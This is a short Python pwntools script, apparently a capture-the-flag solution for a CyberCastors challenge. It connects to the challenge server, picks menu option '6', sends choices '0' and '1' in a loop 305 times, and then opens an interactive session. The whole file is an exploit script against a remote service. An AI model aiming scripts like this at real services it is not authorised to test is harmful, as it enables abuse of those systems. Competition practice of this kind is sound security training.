#!/usr/bin/env python3

from pwn import *

host = "chals20.cybercastors.com"
port = 14432
r = remote(host, port)

r.recv()
r.sendline('6')

for i in range(305):
    print(r.recvuntil("Choice:").decode())
    r.sendline('0')
    print(r.recvuntil("Choice:").decode())
    r.sendline('1')

print(r.recvuntil("Choice:").decode())
r.interactive()
